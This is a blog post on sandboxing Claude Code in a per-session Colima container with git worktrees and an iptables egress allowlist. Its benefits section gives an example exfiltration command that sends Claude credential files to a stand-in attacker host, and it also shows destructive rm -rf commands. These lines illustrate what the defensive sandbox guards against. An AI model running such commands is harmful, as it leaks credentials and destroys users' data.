---
title: "Sandboxing Claude Code in a Long-Lived Container in MacOS"
date: "2026-04-17T22:12:03.284Z"
template: "post"
draft: false
slug: "claude-code-sandbox"
category: "tooling"
tags:
  - "claude-code"
  - "docker"
  - "sandbox"
description: "A wide allowlist is only safe when the blast radius is small. Running Claude Code inside a per-session Colima container with a git worktree and an iptables egress allowlist keeps rm, bash, and gh pr create from ever touching host macOS."
socialImage: "/media/claude-sandbox.jpg"
---

![Sandboxing Claude Code with worktrees and an egress firewall](/media/claude-sandbox.jpg)

Letting an agent run with `rm`, `bash *`, and `gh pr create *` auto-approved is a productivity jump — right up until the moment the agent guesses wrong about which `rm -rf` it was meant to run. The fix isn't a narrower allowlist; it's a smaller blast radius. Drop Claude Code into a Linux container, mount only a throwaway `git worktree` of the repos it should edit, lock outbound traffic to a short allowlist, and suddenly the wide allowlist is a feature instead of a footgun.

This post walks through the full setup end-to-end: installing Colima on macOS, building the sandbox image, an `iptables`-based egress firewall installed at container start, and a launcher script that creates a fresh ephemeral container plus per-session worktrees on every invocation — without making you re-login every time. You should be able to copy-paste your way from zero to a working sandbox in about fifteen minutes (plus ~5 minutes for the first image build).

## 1. Install Colima and the Docker CLI

On macOS we don't want Docker Desktop — it's proprietary and its license gets awkward for commercial use above a small headcount. [Colima](https://github.com/abiosoft/colima) is MIT-licensed and boots a lightweight Linux VM that speaks the Docker API, so the regular `docker` CLI talks to it transparently.

```bash
# Homebrew installs both; the docker CLI is a separate package from Docker Desktop.
brew install colima docker

# Boot the VM. --vm-type vz uses Apple's Virtualization.framework on Apple Silicon
# (faster, less RAM); drop that flag on Intel Macs and it falls back to QEMU.
colima start --cpu 4 --memory 4 --vm-type vz

# Verify: should print server + client versions, no "Cannot connect" error.
docker info
```

If `docker info` errors with "Cannot connect to the Docker daemon," Colima didn't start cleanly — `colima status` will tell you why, usually either "not enough disk" or a stale socket from a previous `Docker Desktop` install. `colima delete && colima start ...` is the reset button.

Colima's VM persists across reboots but not across `colima stop`. Once running, you can mostly forget it exists.

## 2. Wire up GitHub auth before you need it

The sandbox mounts `~/.config/gh` read-only, so `gh` and `git push` inside the container use whatever token your host user has. Create a **fine-grained** personal access token at <https://github.com/settings/personal-access-tokens/new> — scope it to only the repos the agent should touch, grant `Contents: read/write` and `Pull requests: read/write`, leave everything else as **No access**.

Stash the token in macOS Keychain rather than a plaintext dotfile, and export it from your shell rc so the launcher can forward it:

```bash
security add-generic-password -a "$USER" -s gh-token -w "<paste-token-once>"

cat >> ~/.zshrc <<'EOF'
export GH_TOKEN=$(security find-generic-password -s gh-token -w 2>/dev/null)
EOF

exec zsh
gh auth status   # should say: Logged in to github.com (GH_TOKEN)
```

Also make sure `~/.gitconfig` has your name + email — the container mounts it read-only, so commits inside inherit the host identity.

## 3. The Dockerfile

Debian slim base, non-root `agent` user whose uid/gid are injected at build time so bind-mounted files aren't owned by root. Installs a pragmatic toolchain for most projects Claude Code will touch: Node 20 (for `claude` itself), Go 1.22, Python 3, `gh`, `ripgrep`, `jq`, `git`, and `build-essential` — trim or extend as needed. A system-wide gitconfig rewrites `git@github.com:...` SSH remotes to HTTPS on the fly so the credential helper can auth via `gh` — that way we don't need to forward `~/.ssh` into the container at all.

```dockerfile
# sandbox/Dockerfile
FROM debian:bookworm-slim

ARG DEBIAN_FRONTEND=noninteractive
ARG GO_VERSION=1.22.6
# Injected by run-agent.sh so the in-container user matches the host's uid/gid.
ARG HOST_UID=1000
ARG HOST_GID=1000

# Base tooling — --no-install-recommends keeps the layer small.
# iptables/ipset/dnsutils are required by init-firewall.sh, which runs
# at container start to install the egress allowlist (see §4).
RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates curl gnupg \
        git \
        ripgrep jq make python3 \
        build-essential \
        iptables ipset dnsutils \
 && rm -rf /var/lib/apt/lists/*

# GitHub CLI — official apt repo.
RUN curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg \
      | gpg --dearmor -o /usr/share/keyrings/githubcli-archive-keyring.gpg \
 && echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" \
      > /etc/apt/sources.list.d/github-cli.list \
 && apt-get update && apt-get install -y --no-install-recommends gh \
 && rm -rf /var/lib/apt/lists/*

# Node 20 via NodeSource (Debian's nodejs package lags).
RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
 && apt-get install -y --no-install-recommends nodejs \
 && rm -rf /var/lib/apt/lists/*

# Go from official tarball — apt version is too old for us.
RUN set -eux; \
    arch="$(dpkg --print-architecture)"; \
    case "$arch" in \
      amd64) goarch=amd64 ;; \
      arm64) goarch=arm64 ;; \
      *) echo "unsupported arch $arch" >&2; exit 1 ;; \
    esac; \
    curl -fsSL "https://go.dev/dl/go${GO_VERSION}.linux-${goarch}.tar.gz" \
      | tar -C /usr/local -xz
ENV PATH="/usr/local/go/bin:/home/agent/go/bin:${PATH}"
ENV GOPATH=/home/agent/go

# Claude Code CLI itself.
RUN npm install -g @anthropic-ai/claude-code && npm cache clean --force

# Egress firewall script — invoked by run-agent.sh as root via `docker
# exec -u 0` after container start, before the agent user gets a shell.
COPY init-firewall.sh /usr/local/bin/init-firewall.sh
RUN chmod 0755 /usr/local/bin/init-firewall.sh

# Rewrite SSH remotes to HTTPS and use gh as credential helper — avoids
# needing to mount ~/.ssh at all.
RUN printf '%s\n' \
    '[url "https://github.com/"]' \
    '    insteadOf = git@github.com:' \
    '[credential "https://github.com"]' \
    '    helper = !gh auth git-credential' \
    > /etc/gitconfig

# Non-root user matching host uid/gid. macOS's gid 20 (staff) collides with
# Debian's dialout group, so reuse the existing group when the gid is taken.
RUN set -eux; \
    if ! getent group "${HOST_GID}" >/dev/null; then \
        groupadd --system --gid "${HOST_GID}" agent; \
    fi; \
    useradd --system --uid "${HOST_UID}" --gid "${HOST_GID}" \
            --home-dir /home/agent --shell /bin/bash --create-home agent; \
    mkdir -p /workspace /home/agent/go; \
    chown -R "${HOST_UID}:${HOST_GID}" /workspace /home/agent

# Tag the image with the baked-in uid so the launcher can detect stale
# images when the host uid changes and rebuild automatically.
ENV CLAUDE_SANDBOX_UID=${HOST_UID}

USER agent
WORKDIR /workspace
CMD ["claude"]
```

Build it once manually to sanity-check — the launcher will rebuild automatically after this:

```bash
docker build \
    --build-arg HOST_UID="$(id -u)" \
    --build-arg HOST_GID="$(id -g)" \
    -t claude-sandbox:latest sandbox/
```

First build takes ~2 minutes (mostly the Go tarball and `apt-get`). Subsequent builds hit the Docker layer cache and take seconds.

## 4. The egress firewall

If outbound network is wide open, a prompt-injection or a compromised npm package can exfiltrate `/workspace` or the mounted GH token to any attacker-controlled host. The fix is a one-shot script that runs as root inside the container at start: flush iptables, default-DROP `OUTPUT`, then ACCEPT only TCP/443 to an `ipset` populated by resolving a short list of hostnames at install time.

```bash
#!/usr/bin/env bash
# sandbox/init-firewall.sh — runs as root inside the container, called
# by run-agent.sh via `docker exec -u 0` before the agent gets a shell.
set -euo pipefail

ALLOWED_DOMAINS=(
    api.anthropic.com statsig.anthropic.com sentry.io
    registry.npmjs.org registry.yarnpkg.com
    proxy.golang.org sum.golang.org
    github.com api.github.com codeload.github.com
    objects.githubusercontent.com ghcr.io
    # …add hosts your project actually needs (PyPI, GCP, internal APIs, etc.)
)

# Reset state so reruns are idempotent.
iptables -F; iptables -X
iptables -t nat -F; iptables -t nat -X
ipset list allowed-domains >/dev/null 2>&1 && ipset destroy allowed-domains
ipset create allowed-domains hash:net family inet hashsize 1024 maxelem 65536

# Loopback + replies + DNS (so we can resolve allowlisted hosts at runtime).
iptables -A INPUT  -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A INPUT  -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT

# Resolve each host, dump every v4 IP into the ipset.
for host in "${ALLOWED_DOMAINS[@]}"; do
    ips="$(getent ahosts "${host}" | awk '{print $1}' \
        | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | sort -u || true)"
    [[ -z "${ips}" ]] && { echo "[firewall] WARN: ${host} did not resolve"; continue; }
    while IFS= read -r ip; do ipset add allowed-domains "${ip}" 2>/dev/null || true; done <<<"${ips}"
done

# Permit only tcp/443 (and tcp/80 for redirects) to anything in the ipset.
iptables -A OUTPUT -p tcp --dport 443 -m set --match-set allowed-domains dst -j ACCEPT
iptables -A OUTPUT -p tcp --dport 80  -m set --match-set allowed-domains dst -j ACCEPT

# Lock down defaults.
iptables -P INPUT DROP; iptables -P FORWARD DROP; iptables -P OUTPUT DROP

# Sanity check — `-f` would fail on a 404, which still proves we reached
# the host, so use `-sS` so any HTTP response counts as success.
curl -sS --max-time 5 -o /dev/null https://api.anthropic.com \
    || { echo "[firewall] api.anthropic.com unreachable"; exit 1; }
! curl -sS --max-time 5 -o /dev/null https://example.com 2>/dev/null \
    || { echo "[firewall] example.com is reachable (should be blocked)"; exit 1; }
```

A few subtle points worth flagging:

- **Resolve through the container's resolver, not `dig`.** Using `getent ahosts` picks up whatever `/etc/resolv.conf` is set to (usually Docker's embedded DNS at `127.0.0.11`), so allowlisted IPs match what the container will actually resolve at runtime.
- **Keep DNS itself open.** A lot of hosts behind CDNs rotate IPs frequently; resolving once at install and pinning those IPs is fine for a few hours, but DNS has to stay open so libcurl can re-resolve when a tarball is fetched from a new edge.
- **The container needs `--cap-add NET_ADMIN --cap-add NET_RAW`** for `iptables` to work. We still `--cap-drop ALL` first, then add only those two back. The agent user (non-root) can't modify the rules afterwards.

## 5. The launcher

The launcher's job is now bigger than it was. Each invocation:

1. Provisions a `git worktree` per repo under `~/.cache/claude-sandbox/sessions/<id>/` so the agent never touches the host's real working tree.
2. Starts a fresh ephemeral container (`--rm`); session bind-mounts point at the worktree, not at the real checkouts.
3. Installs the firewall as root, then drops into the agent user.
4. On exit, prunes worktrees that have no uncommitted changes and keeps the rest for manual recovery.

OAuth still survives across these ephemeral sessions because Claude Code's persistent state lives on the *host* (in `~/.claude/` and `~/.claude.json`) and we mount both into the container. There's a real gotcha there — see §6.

```bash
#!/usr/bin/env bash
# sandbox/run-agent.sh — launch Claude Code in an ephemeral, per-session sandbox.
set -euo pipefail

IMAGE="claude-sandbox:latest"
SANDBOX_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MASTER_DIR="$(cd "${SANDBOX_DIR}/.." && pwd)"
SESSIONS_ROOT="${HOME}/.cache/claude-sandbox/sessions"

die() { printf 'error: %s\n' "$*" >&2; exit 1; }

# --- Preflight ----------------------------------------------------------
command -v docker >/dev/null 2>&1 || die "install colima + docker first"
docker info      >/dev/null 2>&1 || die "colima not running — 'colima start'"
[[ -n "${GH_TOKEN:-}" || -d "${HOME}/.config/gh" ]] \
    || die "no GH_TOKEN and no ~/.config/gh — set up GitHub auth first"
# See §6 — without ~/.claude.json mounted, every session re-runs first-run setup.
[[ -e "${HOME}/.claude.json" ]] || touch "${HOME}/.claude.json"

HOST_UID="$(id -u)"; HOST_GID="$(id -g)"

# --- Rebuild image if host uid drifted ----------------------------------
IMAGE_UID=""
if docker image inspect "${IMAGE}" >/dev/null 2>&1; then
    IMAGE_UID="$(docker image inspect \
        --format '{{ range .Config.Env }}{{ println . }}{{ end }}' "${IMAGE}" \
      | awk -F= '$1=="CLAUDE_SANDBOX_UID"{print $2}')"
fi
if [[ -z "${IMAGE_UID}" || "${IMAGE_UID}" != "${HOST_UID}" ]]; then
    docker build \
        --build-arg HOST_UID="${HOST_UID}" \
        --build-arg HOST_GID="${HOST_GID}" \
        -t "${IMAGE}" "${SANDBOX_DIR}"
fi

# --- Per-session worktrees ---------------------------------------------
SESSION_ID="$(date -u +%Y%m%dT%H%M%SZ)-$(openssl rand -hex 3)"
SESSION_ROOT="${SESSIONS_ROOT}/${SESSION_ID}"
mkdir -p "${SESSION_ROOT}"
for repo in repo-a repo-b; do
    git -C "${MASTER_DIR}/${repo}" worktree add --detach \
        "${SESSION_ROOT}/${repo}" HEAD >/dev/null
done

CONTAINER_NAME="claude-sandbox-${SESSION_ID}"

cleanup() {
    docker container inspect "${CONTAINER_NAME}" >/dev/null 2>&1 \
        && docker kill "${CONTAINER_NAME}" >/dev/null 2>&1 || true
    for repo in repo-a repo-b; do
        wt="${SESSION_ROOT}/${repo}"
        [[ -d "${wt}" ]] || continue
        if [[ -z "$(git -C "${wt}" status --porcelain 2>/dev/null || echo dirty)" ]]; then
            git -C "${MASTER_DIR}/${repo}" worktree remove --force "${wt}" \
                >/dev/null 2>&1 || true
        else
            printf '→ Kept %s (uncommitted — recover or rm manually)\n' "${wt}"
        fi
    done
    rmdir "${SESSION_ROOT}" 2>/dev/null || true
}
trap cleanup EXIT

# --- Run -----------------------------------------------------------------
docker run -d --rm \
    --name "${CONTAINER_NAME}" --hostname "claude-sandbox" \
    --cap-drop ALL --cap-add NET_ADMIN --cap-add NET_RAW \
    --security-opt no-new-privileges \
    --memory 4g --cpus 4 \
    ${GH_TOKEN:+-e "GH_TOKEN=${GH_TOKEN}"} \
    -v "${SESSION_ROOT}/repo-a:/workspace/repo-a" \
    -v "${SESSION_ROOT}/repo-b:/workspace/repo-b" \
    -v "${MASTER_DIR}/repo-a/.git:${MASTER_DIR}/repo-a/.git" \
    -v "${MASTER_DIR}/repo-b/.git:${MASTER_DIR}/repo-b/.git" \
    -v "${HOME}/.config/gh:/home/agent/.config/gh" \
    -v "${HOME}/.gitconfig:/home/agent/.gitconfig:ro" \
    -v "${HOME}/.claude:/home/agent/.claude" \
    -v "${HOME}/.claude.json:/home/agent/.claude.json" \
    -w /workspace "${IMAGE}" sleep infinity >/dev/null

docker exec -u 0 "${CONTAINER_NAME}" /usr/local/bin/init-firewall.sh \
    || die "firewall init failed — see 'docker logs ${CONTAINER_NAME}'"

# Don't `exec` here — that skips the EXIT trap and leaks containers/worktrees.
docker_exec_flags=(-i); [[ -t 0 ]] && docker_exec_flags+=(-t)
docker exec "${docker_exec_flags[@]}" -w /workspace "${CONTAINER_NAME}" "${@:-claude}"
```

A few things that look like minor stylistic choices but each cost an hour of debugging:

- **Don't `exec docker exec ...` at the end.** `exec` replaces the launcher process, so the `EXIT` trap never fires, and you accumulate orphan containers and stale worktrees on every run. Run the docker exec inline so the trap can clean up.
- **`-t` is conditional on `[[ -t 0 ]]`.** Without that guard, calling the launcher from a non-TTY context (CI, smoke tests, `bash -c` from another script) errors with "cannot attach stdin to a TTY-enabled container."
- **The parent `.git` is mounted writable.** That's the deliberate trade-off for `git commit` to work inside the worktree — git writes objects to the parent `.git`, not the worktree's own `.git` file pointer. Tightening this further is a follow-up (e.g., a git proxy or a per-session bare clone).

## 6. The `~/.claude.json` gotcha

It's tempting to mount only `~/.claude` and call it done — that's where the Claude.ai OAuth token (`~/.claude/.credentials.json`) lives, after all. But ephemeral sessions still re-prompt for first-run setup. A `claude config get` inside the container makes the cause obvious:

```
Claude configuration file not found at: /home/agent/.claude.json
A backup file exists at: /home/agent/.claude/backups/.claude.json.backup...
```

Claude Code splits its state across two paths:

- `~/.claude/` — credentials, agent memory, session state, plugins.
- `~/.claude.json` — a *sibling file* (not inside `~/.claude/`) holding the main config: project history, settings, and the "first-run completed" marker.

Mounting only the directory leaves the sibling file behind. Without it, Claude treats every container as a fresh install and walks you through onboarding again. The fix is one extra `-v` plus a `touch` in the preflight (so docker doesn't auto-create a directory if the host file doesn't exist yet):

```bash
[[ -e "${HOME}/.claude.json" ]] || touch "${HOME}/.claude.json"
…
-v "${HOME}/.claude.json:/home/agent/.claude.json" \
```

Both files are mounted writable, so config and project history written from inside the sandbox propagate back to the host. That also means concurrent host + sandbox sessions both write to the same file — a real race window if you regularly run `claude` in two places at once. For my workflow (one sandbox at a time, host Claude not running) it hasn't bitten; YMMV.

## 7. First run and lifecycle

```bash
chmod +x sandbox/run-agent.sh sandbox/init-firewall.sh
./sandbox/run-agent.sh
```

On first launch, the launcher builds the image (~5 min), provisions the worktrees, starts the container, installs the firewall (`[firewall] ready: 63 IPs allowed across 24 hosts`), and drops you into Claude Code. Because the host's `~/.claude.json` already exists (from your normal host Claude usage), there's no re-onboarding; OAuth comes along for the ride via `~/.claude/.credentials.json`.

A few commands you'll end up using:

| Command | Effect |
|---|---|
| `./sandbox/run-agent.sh` | new session: worktree + container + firewall + claude |
| `./sandbox/run-agent.sh bash` | drop into a shell instead of `claude` |
| Exit `claude` (or Ctrl-D) | container removed; clean worktrees pruned, dirty ones kept |
| `colima stop` / reboot | nothing to recover — sessions were ephemeral anyway |

## What the sandbox buys you

- `rm -rf /workspace/repo-a/*` → wipes the **session worktree only**. The host working tree at `~/code/repo-a/` is untouched.
- `curl https://evil.example/exfil -d @~/.claude/...` → blocked by the egress firewall. Only hosts in `ALLOWED_DOMAINS` are reachable.
- `bash /tmp/random-thing.sh` → runs in container only; container FS wiped on exit.
- `gh pr create ...` → still hits real GitHub (the allowlist is open enough for legitimate work).

What's *still not* isolated: anything you bind-mount is writable from inside, the parent `.git` is mounted writable so commits work (so `rm -rf <repo>/.git` would still nuke the host `.git`), and the allowlist is open enough to reach package registries — supply-chain risk is unchanged. This is a blast-radius reduction tool, not a containment tool for actively malicious code.

## Possible risks

The sandbox is a meaningful step up from "wide allowlist on bare macOS," but it is *not* a full security boundary. Go in knowing what it doesn't protect against:

- **The parent `.git` is still writable.** The worktree shields the *working tree* from `rm -rf`, but a deliberate `rm -rf <repo>/.git` inside the container would nuke the host `.git`. The mount is required for `git commit` to work; tightening this further is a follow-up (e.g., a git proxy, or per-session bare clones with a push-back hook).
- **GitHub token scope is the real blast radius.** If the agent goes wrong, it can do anything your `GH_TOKEN` can do — open/close PRs, push, delete branches, read private code. **Use a fine-grained PAT scoped to only the repos you're working on**, never a classic token or a PAT with org-wide access. Rotate it on any suspected misbehavior (`security add-generic-password -U ...`).
- **The egress allowlist is open enough to do real work.** GitHub, GitLab, npm, the Go module proxy, PyPI, Anthropic, and any internal APIs you add are all reachable. A prompt-injected agent can still publish to any of those, and a compromised package fetched from npm can still read `/workspace` and your `GH_TOKEN`. The firewall stops *novel* outbound destinations (pastebins, attacker C2, telemetry), not abuse of the allowlisted ones.
- **Supply-chain risk is unchanged.** `npm install`, `go get`, `pip install` inside the container still pull code from public registries and execute install scripts with the `agent` user's privileges. The sandbox doesn't vet dependencies; it just limits them to the container FS (but see: parent `.git` + token above).
- **`~/.claude` and `~/.claude.json` are mounted writable.** The container can read OAuth tokens, agent memory, project history, and settings — and write to all of them, propagating back to the host. If you share `~/.claude` between this sandbox and other tooling, assume the container can read all of it. Keep it scoped to Claude Code only.
- **`--cap-drop ALL` is not a kernel-level guarantee.** Container escapes via kernel CVEs are rare but real. The two added caps (`NET_ADMIN`, `NET_RAW`) widen the kernel surface marginally so iptables can run. Keep Colima's VM updated (`colima stop && brew upgrade colima && colima start`), and don't treat the sandbox as strong enough to run genuinely untrusted binaries.
- **No audit trail.** There's no recording of what the agent ran inside the container. If something goes wrong, you get `git reflog` and your shell's scrollback, nothing more. If you need auditability, wrap `run-agent.sh` with `script(1)` or pipe to a logfile.
- **Concurrent host + sandbox writes to `~/.claude.json`.** Both share the same file via bind mount; if you regularly run host Claude in parallel with a sandbox session, there's a real race. For most single-session workflows this hasn't bitten me, but it's a sharp edge worth knowing about.
- **`commit.gpgsign = true` on host breaks commits inside.** No GPG key in the container → commits fail. Either set `commit.gpgsign = false` locally or pass `-c commit.gpgsign=false` per-commit — but be aware you're skipping a check your org may rely on.

Rule of thumb: treat the sandbox like a junior dev with your GitHub credentials and `sudo` on a VM. You wouldn't let that person run arbitrary code without supervision, and you wouldn't give them production tokens. Same discipline here — the firewall and worktree just mean the dev's mistakes don't propagate as fast or as far.

Quote from the book I am reading.

> _The first rule of any technology used in a business is that automation applied to an efficient operation will magnify the efficiency. The second is that automation applied to an inefficient operation will magnify the inefficiency._
>
> — Bill Gates, Business @ the Speed of Thought